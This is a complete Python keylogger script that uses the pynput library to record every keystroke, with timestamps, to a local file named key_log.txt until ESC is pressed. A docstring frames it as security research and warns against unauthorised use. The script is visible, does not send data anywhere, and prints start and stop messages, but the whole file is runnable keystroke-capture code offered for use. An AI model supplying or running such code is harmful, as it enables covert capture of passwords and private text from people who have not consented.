# keylogger.py

"""
Keylogger Software for Security Research
----------------------------------------
This script captures every keystroke made on the keyboard and logs it to a file named 'key_log.txt'.
It is designed for educational and ethical research purposes only.
Do NOT use this script on any system without explicit permission.

Dependencies:
    pip install pynput

Usage:
    python keylogger.py

To stop the keylogger, press ESC.
"""

from pynput.keyboard import Key, Listener
import logging

log_file = "key_log.txt"

# Configure logging to write to the log file
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def on_release(key):
    # Stop listener when ESC is pressed
    if key == Key.esc:
        print("\nESC pressed. Keylogger stopped.")
        return False

if __name__ == "__main__":
    print("Keylogger started. Logging to 'key_log.txt'. Press ESC to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
